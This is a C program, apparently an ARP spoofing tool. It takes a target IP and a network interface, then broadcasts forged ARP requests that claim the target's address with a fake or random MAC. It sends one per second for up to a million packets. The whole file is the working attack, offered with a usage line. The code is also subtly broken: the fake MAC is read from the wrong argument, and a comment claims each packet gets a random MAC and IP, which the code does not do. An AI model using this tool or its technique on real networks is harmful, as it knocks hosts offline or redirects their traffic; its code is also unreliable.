
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <errno.h>

typedef struct {
	// Ethernet header
	uint8_t  dst_mac[6];
	uint8_t  src_mac[6];
	uint16_t eth_proto;

	// ARP
	uint16_t hardware;
	uint16_t protocol;
	uint8_t  hardware_addr_len;
	uint8_t  proto_add_len;
	uint16_t op;
	uint8_t  src_hw_addr   [6];
	uint8_t  src_proto_addr[4];
	uint8_t  tgt_hw_addr   [6];
	uint8_t  tgt_proto_addr[4];
} ARP_header;


void random_buffer(void * buffer, int size) {
	unsigned char * cbuf = (unsigned char*)buffer;
	while (size--)
		*cbuf++ = rand();
}

int main(int argc, char** argv) {
	if (argc < 3) {
		fprintf(stderr, "Usage: %s target-ip interface [fake-mac]\n", argv[0]);
		exit(0);
	}

	uint8_t target_ip[4];
	if (sscanf(argv[1], "%3u.%3u.%3u.%3u", &target_ip[0], &target_ip[1], &target_ip[2], &target_ip[3]) != 4) {
		fprintf(stderr, "Could not parse target ip!\n");
		exit(1);
	}

	uint8_t fake_mac[6];
	if (argc > 3) {
		if (sscanf(argv[1], "%2x:%2x:%2x:%2x:%2x:%2x", &fake_mac[0], &fake_mac[1], &fake_mac[2],
		           &fake_mac[3], &fake_mac[4], &fake_mac[5]) != 6) {
			fprintf(stderr, "Could not parse fake MAC addr!\n");
			exit(1);
		}
	}
	else
		random_buffer(fake_mac, sizeof(fake_mac));

	int arp_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (arp_sock < 0) {
		fprintf(stderr, "Failed to create socket!\n");
		exit(1);
	}

	// Get Interface Index
	struct sockaddr_ll device;
	if ((device.sll_ifindex = if_nametoindex ((const char*)argv[2])) == 0) {
		fprintf(stderr, "if_nametoindex() failed to obtain interface index");
		exit(-1);
  	}
	fprintf (stderr, "Index for interface %s is %i\n", argv[2], device.sll_ifindex);
	device.sll_family = AF_PACKET;
  	device.sll_halen = htons(6);

	// Keep sending packets with random MAC & IP
	for (int i = 0; i < 1000000; i++) {
		// set ARP header
		ARP_header arph;
		arph.hardware = htons (1);
		arph.protocol = htons (0x800);  //2048
		arph.hardware_addr_len  = 6;
		arph.proto_add_len = 4;
		arph.op = htons(1);  // Its a request acording to rfc5227
		memcpy(arph.src_hw_addr,    fake_mac, sizeof(fake_mac));
		memcpy(arph.src_proto_addr, target_ip, sizeof(target_ip));
		memset(arph.tgt_hw_addr,    ~0, sizeof(arph.tgt_hw_addr));
		memcpy(arph.tgt_proto_addr, target_ip, sizeof(target_ip));

		memset(arph.dst_mac, ~0, sizeof(arph.dst_mac));
		memcpy(arph.src_mac, fake_mac, sizeof(fake_mac));
		arph.eth_proto = htons(ETH_P_ARP);
	
		// Send packet to NIC
		if (sendto (arp_sock, &arph, sizeof(arph), 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
		}

		sleep(1);
	}

	// close socket
	close(arp_sock);
}

